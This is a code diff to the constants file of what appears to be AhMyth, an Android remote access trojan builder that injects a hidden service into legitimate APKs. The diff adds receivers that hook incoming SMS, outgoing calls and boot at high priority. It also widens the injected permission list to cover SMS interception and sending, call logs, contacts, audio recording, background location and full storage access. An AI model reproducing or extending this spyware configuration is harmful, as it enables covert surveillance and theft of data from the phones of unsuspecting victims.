@@ -13,16 +13,25 @@ exports.outputApkPath = 'Output';
 exports.logColors = { RED: "red", GREEN: "green", DEFAULT: "white" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
-exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
-exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
+exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/config/InputOutputSocket.smali';
+exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.services.MainService"/>';
+exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.receivers.MyReceiver">' +
     '<intent-filter>' +
     '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
+    '</intent-filter>' +
+    '<intent-filter android:priority="9999">' +
+    '<action android:name="android.provider.Telephony.SMS_RECEIVED" />' +
+    '</intent-filter>' +
+    '<intent-filter>' +
+    '<action android:name="android.intent.action.QUICKBOOT_POWERON"/>' +
+    '</intent-filter>' +
+    '<intent-filter android:priority="5822">' +
+    '<action android:name="android.intent.action.NEW_OUTGOING_CALL"/>' +
     '</intent-filter>' +
     '</receiver>';
 exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
     '\n\n' +
-    '    const-class v1, Lahmyth/mine/king/ahmyth/MainService;' +
+    '    const-class v1, Lahmyth/mine/king/ahmyth/services/MainService;' +
     '\n\n' +
     '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
     '\n\n' +
@@ -32,21 +41,28 @@ exports.orgAppKey = ';->onCreate(Landroid/os/Bundle;)V';
 exports.permissions = [
     '<uses-permission android:name="android.permission.WAKE_LOCK" />',
     '<uses-permission android:name="android.permission.CAMERA" />',
+    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
     '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
+    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />',
     '<uses-permission android:name="android.permission.INTERNET" />',
     '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
     '<uses-permission android:name="android.permission.READ_SMS"/>',
     '<uses-permission android:name="android.permission.SEND_SMS"/>',
-    '<uses-feature android:name="android.hardware.camera" />',
-    '<uses-feature android:name="android.hardware.camera.autofocus" />',
+    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
+    '<uses-permission android:name="android.permission.WRITE_SMS" />',
     '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
     '<uses-permission android:name="android.permission.READ_PHONE_STATE" />',
-    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
     '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
+    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
+    '<uses-permission android:name="android.permission.CALL_PHONE"/>',
+    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />',
+    '<uses-permission android:name="android.permission.READ_CONTACTS" />',
     '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
     '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
     '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
-    '<uses-permission android:name="android.permission.READ_CONTACTS" />'
+    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
+    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
+    '<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
 ]
 
 
